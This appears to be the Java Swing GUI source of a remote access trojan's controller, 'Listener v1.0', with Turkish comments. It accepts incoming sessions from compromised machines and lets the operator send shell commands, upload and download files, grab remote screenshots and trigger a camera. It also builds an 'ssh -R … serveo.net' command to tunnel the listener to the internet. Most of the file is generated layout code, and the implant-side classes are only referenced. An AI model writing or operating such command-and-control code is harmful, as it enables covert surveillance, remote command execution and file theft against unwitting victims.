package com.hack.listener;

import java.awt.BorderLayout;
import java.awt.HeadlessException;
import java.awt.Image;
import java.io.IOException;
import java.net.Socket;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;

public class UI extends javax.swing.JFrame {
    
    private Tunnel tunnel;
    private FilesOperations files;
    private SessionListener listener;
    private final SessionList sessionList;
    private CommandSend send;
    private Screenshot shot;

    public UI() {
        initComponents();
        
        // Sol Shift + Enter tuş kombinasyonunu dinle
        command_input.getInputMap(javax.swing.JComponent.WHEN_FOCUSED).put(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_ENTER, java.awt.event.InputEvent.SHIFT_DOWN_MASK), "shiftEnter");

        command_input.getActionMap().put("shiftEnter", new javax.swing.AbstractAction() {
            @Override
            public void actionPerformed(java.awt.event.ActionEvent ae) {
                send_command_button.doClick();
            }
        });
        sessionList = new SessionList(session_list);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jTabbedPane1 = new javax.swing.JTabbedPane();
        listener1 = new javax.swing.JPanel();
        session_list_scroll = new javax.swing.JScrollPane();
        session_list = new javax.swing.JList<>();
        upload_button = new javax.swing.JButton();
        listen_button = new javax.swing.JButton();
        download_button = new javax.swing.JButton();
        screenshot_button = new javax.swing.JButton();
        send_command_button = new javax.swing.JButton();
        camera_button = new javax.swing.JButton();
        command_input_scroll = new javax.swing.JScrollPane();
        command_input = new javax.swing.JTextArea();
        jLabel1 = new javax.swing.JLabel();
        close_button = new javax.swing.JButton();
        command_output_scroll = new javax.swing.JScrollPane();
        command_output = new javax.swing.JTextArea();
        listen_ip_checkbox = new javax.swing.JCheckBox();
        port_input = new javax.swing.JTextField();
        ip_address_input = new javax.swing.JTextField();
        clear_button = new javax.swing.JButton();
        info2 = new javax.swing.JPanel();
        serveo_output_scroll = new javax.swing.JScrollPane();
        serveo_output = new javax.swing.JTextArea();
        jLabel2 = new javax.swing.JLabel();
        serveo_ip_address_input = new javax.swing.JTextField();
        connect_port_input = new javax.swing.JTextField();
        tunnel_checkbox = new javax.swing.JCheckBox();
        forward_port_input = new javax.swing.JTextField();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        domain_address_input = new javax.swing.JTextField();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Listener v1.0");
        setName("listener"); // NOI18N

        session_list.setModel(new javax.swing.AbstractListModel<String>() {
            String[] strings = { "Item 1", "Item 2", "Item 3", "Item 4", "Item 5" };
            public int getSize() { return strings.length; }
            public String getElementAt(int i) { return strings[i]; }
        });
        session_list_scroll.setViewportView(session_list);

        upload_button.setText("upload");
        upload_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                upload_buttonActionPerformed(evt);
            }
        });

        listen_button.setText("listen");
        listen_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                listen_buttonActionPerformed(evt);
            }
        });

        download_button.setText("download");
        download_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                download_buttonActionPerformed(evt);
            }
        });

        screenshot_button.setText("screenshot");
        screenshot_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                screenshot_buttonActionPerformed(evt);
            }
        });

        send_command_button.setText("send command");
        send_command_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                send_command_buttonActionPerformed(evt);
            }
        });

        camera_button.setText("camera");
        camera_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                camera_buttonActionPerformed(evt);
            }
        });

        command_input.setColumns(20);
        command_input.setRows(5);
        command_input_scroll.setViewportView(command_input);

        jLabel1.setText("Enter the command you want to send");

        close_button.setText("close");
        close_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                close_buttonActionPerformed(evt);
            }
        });

        command_output.setEditable(false);
        command_output.setColumns(20);
        command_output.setRows(5);
        command_output.setText("command output");
        command_output.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        command_output_scroll.setViewportView(command_output);

        listen_ip_checkbox.setText("listen to ip address");
        listen_ip_checkbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                listen_ip_checkboxActionPerformed(evt);
            }
        });

        port_input.setText("8080");
        port_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                port_inputActionPerformed(evt);
            }
        });

        ip_address_input.setText("0.0.0.0");
        ip_address_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ip_address_inputActionPerformed(evt);
            }
        });

        clear_button.setText("clear all");
        clear_button.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clear_buttonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout listener1Layout = new javax.swing.GroupLayout(listener1);
        listener1.setLayout(listener1Layout);
        listener1Layout.setHorizontalGroup(
            listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 1073, Short.MAX_VALUE)
            .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(listener1Layout.createSequentialGroup()
                    .addContainerGap()
                    .addComponent(session_list_scroll, javax.swing.GroupLayout.PREFERRED_SIZE, 264, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                    .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGroup(listener1Layout.createSequentialGroup()
                            .addComponent(screenshot_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(listen_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(camera_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(download_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(upload_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(clear_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(close_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(send_command_button, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addComponent(command_input_scroll)
                        .addGroup(listener1Layout.createSequentialGroup()
                            .addComponent(jLabel1)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(ip_address_input)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(port_input, javax.swing.GroupLayout.PREFERRED_SIZE, 58, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(listen_ip_checkbox))
                        .addComponent(command_output_scroll))
                    .addContainerGap()))
        );
        listener1Layout.setVerticalGroup(
            listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 525, Short.MAX_VALUE)
            .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(listener1Layout.createSequentialGroup()
                    .addContainerGap()
                    .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(session_list_scroll)
                        .addGroup(listener1Layout.createSequentialGroup()
                            .addComponent(command_output_scroll, javax.swing.GroupLayout.DEFAULT_SIZE, 364, Short.MAX_VALUE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                .addComponent(jLabel1)
                                .addComponent(listen_ip_checkbox)
                                .addComponent(port_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addComponent(ip_address_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addComponent(command_input_scroll, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                            .addGroup(listener1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                .addComponent(send_command_button)
                                .addComponent(upload_button)
                                .addComponent(download_button)
                                .addComponent(camera_button)
                                .addComponent(listen_button)
                                .addComponent(screenshot_button)
                                .addComponent(close_button)
                                .addComponent(clear_button))))
                    .addContainerGap()))
        );

        jTabbedPane1.addTab("Lissener", listener1);

        info2.setMaximumSize(new java.awt.Dimension(0, 0));

        serveo_output.setEditable(false);
        serveo_output.setColumns(20);
        serveo_output.setRows(5);
        serveo_output.setText("serveo output");
        serveo_output.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        serveo_output_scroll.setViewportView(serveo_output);

        jLabel2.setText("Enter the IP address to forward to");

        serveo_ip_address_input.setText("localhost");
        serveo_ip_address_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                serveo_ip_address_inputActionPerformed(evt);
            }
        });

        connect_port_input.setText("8080");
        connect_port_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connect_port_inputActionPerformed(evt);
            }
        });

        tunnel_checkbox.setText("Start tunnel service");
        tunnel_checkbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                tunnel_checkboxActionPerformed(evt);
            }
        });

        forward_port_input.setText("8080");
        forward_port_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                forward_port_inputActionPerformed(evt);
            }
        });

        jLabel3.setText("Enter the port to connect to");

        jLabel4.setText("Enter the port to forward to");

        jLabel5.setText("Domain address (Private session)");

        domain_address_input.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                domain_address_inputActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout info2Layout = new javax.swing.GroupLayout(info2);
        info2.setLayout(info2Layout);
        info2Layout.setHorizontalGroup(
            info2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, info2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(info2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(info2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                        .addComponent(jLabel2)
                        .addComponent(tunnel_checkbox)
                        .addComponent(jLabel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(serveo_ip_address_input)
                        .addComponent(connect_port_input)
                        .addComponent(forward_port_input))
                    .addComponent(jLabel5)
                    .addComponent(domain_address_input))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(serveo_output_scroll, javax.swing.GroupLayout.DEFAULT_SIZE, 880, Short.MAX_VALUE)
                .addContainerGap())
        );
        info2Layout.setVerticalGroup(
            info2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(info2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(info2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(serveo_output_scroll, javax.swing.GroupLayout.DEFAULT_SIZE, 513, Short.MAX_VALUE)
                    .addGroup(info2Layout.createSequentialGroup()
                        .addComponent(jLabel5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(domain_address_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel2)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(serveo_ip_address_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel3)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(connect_port_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(forward_port_input, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(tunnel_checkbox)
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
        );

        jTabbedPane1.addTab("Tunnel", info2);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.Alignment.TRAILING)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1, javax.swing.GroupLayout.Alignment.TRAILING)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents
    private void screenshot_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_screenshot_buttonActionPerformed
        
        try {
            shot = new Screenshot(sessionList.selectedSocket());
            
            Image image = shot.screenshot();
            JLabel imageLabel = new JLabel(new ImageIcon(image));
            
            JPanel panel = new JPanel(new BorderLayout());
            panel.add(imageLabel, BorderLayout.CENTER);

            // JScrollPane oluşturun ve JPanel'i içine yerleştirin
            JScrollPane scrollPane = new JScrollPane(panel);

            // JFrame oluşturun ve JScrollPane'i içine yerleştirin
            JFrame frame = new JFrame("Image Viewer");
            frame.add(scrollPane);
            frame.pack();
            frame.setVisible(true);
        } catch (IndexOutOfBoundsException | NullPointerException | HeadlessException | IOException e) {
            ErrorDialog.showError("Hata olustu.");
            System.out.println(e);
        }
        
    }//GEN-LAST:event_screenshot_buttonActionPerformed

    private void listen_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_listen_buttonActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_listen_buttonActionPerformed

    private void camera_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_camera_buttonActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_camera_buttonActionPerformed

    private void download_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_download_buttonActionPerformed
        files = new FilesOperations(sessionList.selectedSocket());
        try {
            files.download(command_input.getText());
        } catch (IOException e) {
            ErrorDialog.showError("Hata olustu");
            System.out.println(e);
        }
    }//GEN-LAST:event_download_buttonActionPerformed

    private void upload_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_upload_buttonActionPerformed
        files = new FilesOperations(sessionList.selectedSocket());
        try {
            files.upload();
        } catch (IOException e) {
            ErrorDialog.showError("Hata olustu");
            System.out.println(e);
        }
    }//GEN-LAST:event_upload_buttonActionPerformed

    private void send_command_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_send_command_buttonActionPerformed
        
        send = new CommandSend(sessionList.selectedSocket(), command_input.getText());
        try {
            String output = send.commandExecution().toString().replaceAll("\\\\n", "\n").replaceAll("\"", "");
            command_output.setText(output);
        } catch (IOException e) {
            ErrorDialog.showError("Hata olustu");
            System.out.println(e);
        }
        
    }//GEN-LAST:event_send_command_buttonActionPerformed

    private void close_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_close_buttonActionPerformed
        
        try {
            sessionList.selectedSocket().close();
            sessionList.deleteSession();
        } catch (IOException e) {
            ErrorDialog.showError("Hata olustu");
            System.out.println(e);
        }
        
    }//GEN-LAST:event_close_buttonActionPerformed

    private void ip_address_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ip_address_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_ip_address_inputActionPerformed

    private void port_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_port_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_port_inputActionPerformed

    private void listen_ip_checkboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_listen_ip_checkboxActionPerformed
        
        String ipAddress = ip_address_input.getText();
        int portNumber = Integer.parseInt(port_input.getText());

        if (listen_ip_checkbox.isSelected()) {
            listener = new SessionListener(portNumber, ipAddress);
            // Listener'a geri çağırımı (callback) ayarla
            listener.setConnectionListener((Socket sockets, String hostname) -> {
                sessionList.sessionList(sockets, hostname);
            });
            // Dinlemeyi başlat
            listener.start();
        } else {
            listenerClosed();
        }
        
    }//GEN-LAST:event_listen_ip_checkboxActionPerformed

    public void listenerClosed(){
        if (listener != null) {
            listener.stopListening();
        }
    }
    
    private void clear_buttonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clear_buttonActionPerformed
        sessionList.deleteAllSession();
    }//GEN-LAST:event_clear_buttonActionPerformed

    private void forward_port_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_forward_port_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_forward_port_inputActionPerformed

    private void tunnel_checkboxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_tunnel_checkboxActionPerformed
        String serveoCommand;
        
        String domainAddress = domain_address_input.getText();
        
        if(!domainAddress.isEmpty()){
            serveoCommand = "ssh -R " + domainAddress + ":" + connect_port_input.getText() + ":" + serveo_ip_address_input.getText() + ":" + forward_port_input.getText() + " serveo.net";
        }else{
            serveoCommand = "ssh -R " + connect_port_input.getText() + ":" + serveo_ip_address_input.getText() + ":" + forward_port_input.getText() + " serveo.net";
        }
        
        if (tunnel_checkbox.isSelected()) {
            tunnel = new Tunnel(serveoCommand);
            tunnel.setTunnelListener((String output) -> {
                serveo_output.setText(output);
            });
            tunnel.start();
        } else {
            tunnelStop();
        }
        
    }//GEN-LAST:event_tunnel_checkboxActionPerformed

    public void tunnelStop(){
        tunnel.stopTunnel();
    }
    
    private void connect_port_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connect_port_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_connect_port_inputActionPerformed

    private void serveo_ip_address_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_serveo_ip_address_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_serveo_ip_address_inputActionPerformed

    private void domain_address_inputActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_domain_address_inputActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_domain_address_inputActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    javax.swing.JButton camera_button;
    javax.swing.JButton clear_button;
    javax.swing.JButton close_button;
    javax.swing.JTextArea command_input;
    javax.swing.JScrollPane command_input_scroll;
    javax.swing.JTextArea command_output;
    javax.swing.JScrollPane command_output_scroll;
    javax.swing.JTextField connect_port_input;
    javax.swing.JTextField domain_address_input;
    javax.swing.JButton download_button;
    javax.swing.JTextField forward_port_input;
    javax.swing.JPanel info2;
    javax.swing.JTextField ip_address_input;
    javax.swing.JLabel jLabel1;
    javax.swing.JLabel jLabel2;
    javax.swing.JLabel jLabel3;
    javax.swing.JLabel jLabel4;
    javax.swing.JLabel jLabel5;
    javax.swing.JTabbedPane jTabbedPane1;
    javax.swing.JButton listen_button;
    javax.swing.JCheckBox listen_ip_checkbox;
    javax.swing.JPanel listener1;
    javax.swing.JTextField port_input;
    javax.swing.JButton screenshot_button;
    javax.swing.JButton send_command_button;
    javax.swing.JTextField serveo_ip_address_input;
    javax.swing.JTextArea serveo_output;
    javax.swing.JScrollPane serveo_output_scroll;
    javax.swing.JList<String> session_list;
    javax.swing.JScrollPane session_list_scroll;
    javax.swing.JCheckBox tunnel_checkbox;
    javax.swing.JButton upload_button;
    // End of variables declaration//GEN-END:variables
}
